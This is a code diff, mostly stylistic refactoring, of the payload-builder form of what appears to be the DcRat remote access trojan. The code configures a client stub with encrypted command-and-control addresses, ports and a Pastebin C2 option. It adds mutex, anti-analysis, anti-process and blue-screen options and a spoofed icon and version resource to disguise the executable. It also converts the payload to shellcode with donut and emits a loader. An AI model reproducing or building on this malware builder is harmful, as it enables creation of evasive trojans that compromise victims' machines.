@@ -1,24 +1,29 @@
 ﻿using System;
-using System.Windows.Forms;
-using Server.Helper;
-using System.Text;
-using System.Security.Cryptography;
-using Server.Algorithm;
-using System.Security.Cryptography.X509Certificates;
 using System.Collections.Generic;
-using Vestris.ResourceLib;
-using dnlib.DotNet;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Security.Cryptography;
+using System.Security.Cryptography.X509Certificates;
+using System.Text;
+using System.Windows.Forms;
+using dnlib.DotNet;
 using dnlib.DotNet.Emit;
-using System.Threading.Tasks;
-using System.Diagnostics;
+using Server.Algorithm;
+using Server.Helper;
+using Server.Properties;
 using Toolbelt.Drawing;
+using Vestris.ResourceLib;
 
 namespace Server.Forms
 {
     public partial class FormBuilder : Form
     {
+        private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";
+
+
+        private readonly Random random = new Random();
+
         public FormBuilder()
         {
             InitializeComponent();
@@ -28,23 +33,19 @@ namespace Server.Forms
         {
             try
             {
-                List<string> Pstring = new List<string>();
-                foreach (string port in listBoxPort.Items)
-                {
-                    Pstring.Add(port);
-                }
+                var Pstring = new List<string>();
+                foreach (string port in listBoxPort.Items) Pstring.Add(port);
                 Properties.Settings.Default.Ports = string.Join(",", Pstring);
 
-                List<string> IPstring = new List<string>();
-                foreach (string ip in listBoxIP.Items)
-                {
-                    IPstring.Add(ip);
-                }
+                var IPstring = new List<string>();
+                foreach (string ip in listBoxIP.Items) IPstring.Add(ip);
                 Properties.Settings.Default.IP = string.Join(",", IPstring);
 
                 Properties.Settings.Default.Save();
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         private void checkBox1_CheckedChanged(object sender, EventArgs e)
@@ -74,25 +75,25 @@ namespace Server.Forms
 
             try
             {
-                string[] ports = Properties.Settings.Default.Ports.Split(new[] { "," }, StringSplitOptions.None);
-                foreach (string item in ports)
-                {
+                var ports = Properties.Settings.Default.Ports.Split(new[] { "," }, StringSplitOptions.None);
+                foreach (var item in ports)
                     if (!string.IsNullOrWhiteSpace(item))
                         listBoxPort.Items.Add(item.Trim());
-                }
             }
-            catch { }
+            catch
+            {
+            }
 
             try
             {
-                string[] ip = Properties.Settings.Default.IP.Split(new[] { "," }, StringSplitOptions.None);
-                foreach (string item in ip)
-                {
+                var ip = Properties.Settings.Default.IP.Split(new[] { "," }, StringSplitOptions.None);
+                foreach (var item in ip)
                     if (!string.IsNullOrWhiteSpace(item))
                         listBoxIP.Items.Add(item.Trim());
-                }
             }
-            catch { }
+            catch
+            {
+            }
 
             if (Properties.Settings.Default.Mutex.Length == 0)
                 txtMutex.Text = getRandomCharacters();
@@ -129,10 +130,7 @@ namespace Server.Forms
 
         private void BtnRemovePort_Click(object sender, EventArgs e)
         {
-            if (listBoxPort.SelectedItems.Count == 1)
-            {
-                listBoxPort.Items.Remove(listBoxPort.SelectedItem);
-            }
+            if (listBoxPort.SelectedItems.Count == 1) listBoxPort.Items.Remove(listBoxPort.SelectedItem);
         }
 
         private void BtnAddPort_Click(object sender, EventArgs e)
@@ -141,22 +139,19 @@ namespace Server.Forms
             {
                 Convert.ToInt32(textPort.Text.Trim());
                 foreach (string item in listBoxPort.Items)
-                {
                     if (item.Equals(textPort.Text.Trim()))
                         return;
-                }
                 listBoxPort.Items.Add(textPort.Text.Trim());
                 textPort.Clear();
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         private void BtnRemoveIP_Click(object sender, EventArgs e)
         {
-            if (listBoxIP.SelectedItems.Count == 1)
-            {
-                listBoxIP.Items.Remove(listBoxIP.SelectedItem);
-            }
+            if (listBoxIP.SelectedItems.Count == 1) listBoxIP.Items.Remove(listBoxIP.SelectedItem);
         }
 
         private void BtnAddIP_Click(object sender, EventArgs e)
@@ -169,19 +164,23 @@ namespace Server.Forms
                     if (item.Equals(textIP.Text))
                         return;
                 }
+
                 listBoxIP.Items.Add(textIP.Text.Replace(" ", ""));
                 textIP.Clear();
             }
-            catch { }
+            catch
+            {
+            }
         }
 
-        private async void BtnBuild_Click(object sender, EventArgs e)
+        private void BtnBuild_Click(object sender, EventArgs e)
         {
-            if (!chkPaste_bin.Checked && listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0) return;
+            if ((!chkPaste_bin.Checked && listBoxIP.Items.Count == 0) || listBoxPort.Items.Count == 0) return;
 
             if (checkBox1.Checked)
             {
-                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
+                if (string.IsNullOrWhiteSpace(textFilename.Text) ||
+                    string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                 if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
             }
 
@@ -190,12 +189,11 @@ namespace Server.Forms
             if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text)) return;
 
 
-
             ModuleDefMD asmDef = null;
             try
             {
                 using (asmDef = ModuleDefMD.Load(@"Stub/Client.exe"))
-                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
+                using (var saveFileDialog1 = new SaveFileDialog())
                 {
                     saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                     saveFileDialog1.InitialDirectory = Application.StartupPath;
@@ -208,17 +206,12 @@ namespace Server.Forms
                         WriteSettings(asmDef, saveFileDialog1.FileName);
                         asmDef.Write(saveFileDialog1.FileName);
                         asmDef.Dispose();
-                        if (btnAssembly.Checked)
-                        {
-                            WriteAssembly(saveFileDialog1.FileName);
-                        }
+                        if (btnAssembly.Checked) WriteAssembly(saveFileDialog1.FileName);
                         if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
-                        {
                             IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
-                        }
                         MessageBox.Show("Done!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                         SaveSettings();
-                        this.Close();
+                        Close();
                     }
                 }
             }
@@ -227,7 +220,6 @@ namespace Server.Forms
                 MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 asmDef?.Dispose();
                 btnBuild.Enabled = true;
-
             }
         }
 
@@ -235,14 +227,14 @@ namespace Server.Forms
         {
             try
             {
-                VersionResource versionResource = new VersionResource();
+                var versionResource = new VersionResource();
                 versionResource.LoadFrom(filename);
 
                 versionResource.FileVersion = txtFileVersion.Text;
                 versionResource.ProductVersion = txtProductVersion.Text;
                 versionResource.Language = 0;
 
-                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
+                var stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                 stringFileInfo["ProductName"] = txtProduct.Text;
                 stringFileInfo["FileDescription"] = txtDescription.Text;
                 stringFileInfo["CompanyName"] = txtCompany.Text;
@@ -308,7 +300,7 @@ namespace Server.Forms
 
         private void BtnIcon_Click(object sender, EventArgs e)
         {
-            using (OpenFileDialog ofd = new OpenFileDialog())
+            using (var ofd = new OpenFileDialog())
             {
                 ofd.Title = "Choose Icon";
                 ofd.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
@@ -317,7 +309,7 @@ namespace Server.Forms
                 {
                     if (ofd.FileName.ToLower().EndsWith(".exe"))
                     {
-                        string ico = GetIcon(ofd.FileName);
+                        var ico = GetIcon(ofd.FileName);
                         txtIcon.Text = ico;
                         picIcon.ImageLocation = ico;
                     }
@@ -334,14 +326,18 @@ namespace Server.Forms
         {
             try
             {
-                string tempFile = Path.GetTempFileName() + ".ico";
-                using (FileStream fs = new FileStream(tempFile, FileMode.Create))
+                var tempFile = Path.GetTempFileName() + ".ico";
+                using (var fs = new FileStream(tempFile, FileMode.Create))
                 {
                     IconExtractor.Extract1stIconTo(path, fs);
                 }
+
                 return tempFile;
             }
-            catch { }
+            catch
+            {
+            }
+
             return "";
         }
 
@@ -360,16 +356,15 @@ namespace Server.Forms
                     signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
                 }
 
-                foreach (TypeDef type in asmDef.Types)
+                foreach (var type in asmDef.Types)
                 {
                     asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                     asmDef.Name = Path.GetFileName(AsmName);
-                     if (type.Name == "Settings")
-                        foreach (MethodDef method in type.Methods)
+                    if (type.Name == "Settings")
+                        foreach (var method in type.Methods)
                         {
                             if (method.Body == null) continue;
-                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
-                            {
+                            for (var i = 0; i < method.Body.Instructions.Count(); i++)
                                 if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                 {
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Ports%")
@@ -380,12 +375,10 @@ namespace Server.Forms
                                         }
                                         else
                                         {
-                                            List<string> LString = new List<string>();
-                                            foreach (string port in listBoxPort.Items)
-                                            {
-                                                LString.Add(port);
-                                            }
-                                            method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
+                                            var LString = new List<string>();
+                                            foreach (string port in listBoxPort.Items) LString.Add(port);
+                                            method.Body.Instructions[i].Operand =
+                                                aes.Encrypt(string.Join(",", LString));
                                         }
                                     }
 
@@ -397,17 +390,16 @@ namespace Server.Forms
                                         }
                                         else
                                         {
-                                            List<string> LString = new List<string>();
-                                            foreach (string ip in listBoxIP.Items)
-                                            {
-                                                LString.Add(ip);
-                                            }
-                                            method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
+                                            var LString = new List<string>();
+                                            foreach (string ip in listBoxIP.Items) LString.Add(ip);
+                                            method.Body.Instructions[i].Operand =
+                                                aes.Encrypt(string.Join(",", LString));
                                         }
                                     }
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Install%")
-                                        method.Body.Instructions[i].Operand = aes.Encrypt(checkBox1.Checked.ToString().ToLower());
+                                        method.Body.Instructions[i].Operand =
+                                            aes.Encrypt(checkBox1.Checked.ToString().ToLower());
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Folder%")
                                         method.Body.Instructions[i].Operand = comboBoxFolder.Text;
@@ -417,28 +409,35 @@ namespace Server.Forms
                                         method.Body.Instructions[i].Operand = textFilename.Text;
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
-                                        method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("DcRat ", ""));
+                                        method.Body.Instructions[i].Operand =
+                                            aes.Encrypt(Settings.Version.Replace("DcRat ", ""));
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
-                                        method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));
+                                        method.Body.Instructions[i].Operand =
+                                            Convert.ToBase64String(Encoding.UTF8.GetBytes(key));
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
                                         method.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
-                                        method.Body.Instructions[i].Operand = aes.Encrypt(chkAnti.Checked.ToString().ToLower());
+                                        method.Body.Instructions[i].Operand =
+                                            aes.Encrypt(chkAnti.Checked.ToString().ToLower());
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%AntiProcess%")
-                                        method.Body.Instructions[i].Operand = aes.Encrypt(chkAntiProcess.Checked.ToString().ToLower());
+                                        method.Body.Instructions[i].Operand =
+                                            aes.Encrypt(chkAntiProcess.Checked.ToString().ToLower());
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Certificate%")
-                                        method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
+                                        method.Body.Instructions[i].Operand = aes.Encrypt(
+                                            Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
-                                        method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
+                                        method.Body.Instructions[i].Operand =
+                                            aes.Encrypt(Convert.ToBase64String(signature));
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%BSOD%")
-                                        method.Body.Instructions[i].Operand = aes.Encrypt(chkBsod.Checked.ToString().ToLower());
+                                        method.Body.Instructions[i].Operand =
+                                            aes.Encrypt(chkBsod.Checked.ToString().ToLower());
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Paste_bin%")
                                         if (chkPaste_bin.Checked)
@@ -452,7 +451,6 @@ namespace Server.Forms
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
                                         method.Body.Instructions[i].Operand = aes.Encrypt(txtGroup.Text);
                                 }
-                            }
                         }
                 }
             }
@@ -462,18 +460,15 @@ namespace Server.Forms
             }
         }
 
-
-        private readonly Random random = new Random();
-        const string alphabet = "asdfghjklqwertyuiopmnbvcxz";
-
         public string getRandomCharacters()
         {
             var sb = new StringBuilder();
-            for (int i = 1; i <= new Random().Next(10, 20); i++)
+            for (var i = 1; i <= new Random().Next(10, 20); i++)
             {
                 var randomCharacterPosition = random.Next(0, alphabet.Length);
                 sb.Append(alphabet[randomCharacterPosition]);
             }
+
             return sb.ToString();
         }
 
@@ -494,20 +489,24 @@ namespace Server.Forms
                     txtTrademarks.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;
 
                     var version = fileVersionInfo.FileMajorPart;
-                    txtFileVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
-                    txtProductVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
+                    txtFileVersion.Text =
+                        $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
+                    txtProductVersion.Text =
+                        $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                 }
             }
         }
 
         private void btnShellcode_Click(object sender, EventArgs e)
         {
-            if (!chkPaste_bin.Checked && listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0) return;
+            if ((!chkPaste_bin.Checked && listBoxIP.Items.Count == 0) || listBoxPort.Items.Count == 0) return;
             if (checkBox1.Checked)
             {
-                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
+                if (string.IsNullOrWhiteSpace(textFilename.Text) ||
+                    string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                 if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
             }
+
             if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = getRandomCharacters();
             if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text)) return;
             ModuleDefMD asmDef = null;
@@ -515,44 +514,31 @@ namespace Server.Forms
             {
                 using (asmDef = ModuleDefMD.Load(@"Stub/Client.exe"))
                 {
-                    string Temppath = Path.Combine(Application.StartupPath, @"Stub\tempClient.exe");
-                    if (File.Exists(Temppath)) 
-                    {
-                        File.Delete(Temppath);
-                    }
-                    
+                    var Temppath = Path.Combine(Application.StartupPath, @"Stub\tempClient.exe");
+                    if (File.Exists(Temppath)) File.Delete(Temppath);
+
                     File.Copy(Path.Combine(Application.StartupPath, @"Stub\Client.exe"), Temppath);
                     btnShellcode.Enabled = false;
                     btnBuild.Enabled = false;
                     WriteSettings(asmDef, Temppath);
                     asmDef.Write(Temppath);
                     asmDef.Dispose();
-                    if (btnAssembly.Checked)
-                    {
-                        WriteAssembly(Temppath);
-                    }
+                    if (btnAssembly.Checked) WriteAssembly(Temppath);
                     if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
-                    {
                         IconInjector.InjectIcon(Temppath, txtIcon.Text);
-                    }
-                    string savepath = "";
-                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
+                    var savepath = "";
+                    using (var saveFileDialog1 = new SaveFileDialog())
                     {
                         saveFileDialog1.Filter = ".bin (*.bin)|*.bin";
                         saveFileDialog1.InitialDirectory = Application.StartupPath;
                         saveFileDialog1.OverwritePrompt = false;
                         saveFileDialog1.FileName = "Client";
-                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
-                        {
-                            savepath = saveFileDialog1.FileName;
-                        }
+                        if (saveFileDialog1.ShowDialog() == DialogResult.OK) savepath = saveFileDialog1.FileName;
                     }
-                    string Donutpath = Path.Combine(Application.StartupPath, @"Plugins\donut.exe");
-                    if (!File.Exists(Donutpath)) 
-                    {
-                        File.WriteAllBytes(Donutpath,Properties.Resources.donut);
-                    }
-                    Process Process = new Process();
+
+                    var Donutpath = Path.Combine(Application.StartupPath, @"Plugins\donut.exe");
+                    if (!File.Exists(Donutpath)) File.WriteAllBytes(Donutpath, Resources.donut);
+                    var Process = new Process();
                     Process.StartInfo.FileName = Donutpath;
                     Process.StartInfo.CreateNoWindow = true;
                     Process.StartInfo.Arguments = "-f " + Temppath + " -o " + savepath;
@@ -561,14 +547,17 @@ namespace Server.Forms
                     Process.Close();
                     if (File.Exists(savepath))
                     {
-                        File.WriteAllText(savepath + "loader.cs", Properties.Resources.ShellcodeLoader.Replace("%qwqdanchun%", Convert.ToBase64String(File.ReadAllBytes(savepath))));
+                        File.WriteAllText(savepath + "loader.cs",
+                            Resources.ShellcodeLoader.Replace("%qwqdanchun%",
+                                Convert.ToBase64String(File.ReadAllBytes(savepath))));
                         File.WriteAllText(savepath + ".b64", Convert.ToBase64String(File.ReadAllBytes(savepath)));
                     }
+
                     File.Delete(Temppath);
                     File.Delete(Donutpath);
                     MessageBox.Show("Done!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                     SaveSettings();
-                    this.Close();
+                    Close();
                 }
             }
             catch (Exception ex)
@@ -576,7 +565,6 @@ namespace Server.Forms
                 MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 asmDef?.Dispose();
                 btnBuild.Enabled = true;
-
             }
         }
     }
